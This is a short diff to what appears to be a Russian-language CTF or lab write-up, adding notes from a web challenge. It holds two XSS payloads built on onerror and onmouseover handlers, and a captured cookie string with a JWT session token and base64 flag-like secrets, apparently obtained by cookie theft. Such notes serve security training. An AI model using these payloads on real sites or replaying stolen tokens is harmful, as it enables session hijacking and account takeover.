@@ -127,8 +127,22 @@ Command Execution: уровень 4
 
  ![image](https://github.com/user-attachments/assets/b4bddabe-5e73-41a6-920c-91eb1c49f105)
 
-
 {"alg":"HS256","typ":"JWT"}
+
+
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+
+
+<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
+
+
+![image](https://github.com/user-attachments/assets/3092edf7-eacf-44ef-9b63-c685cb6f04ae)
+
+
+token_dare=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU; secret=MzB7WDU1X0MwMGsxM19Nb05TdDNyX30K; important_person_cookies=MzB7eHM1XzFkS193SDBfbjMzRF9pdH0K; token_dare=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU
+
+
 
 
 
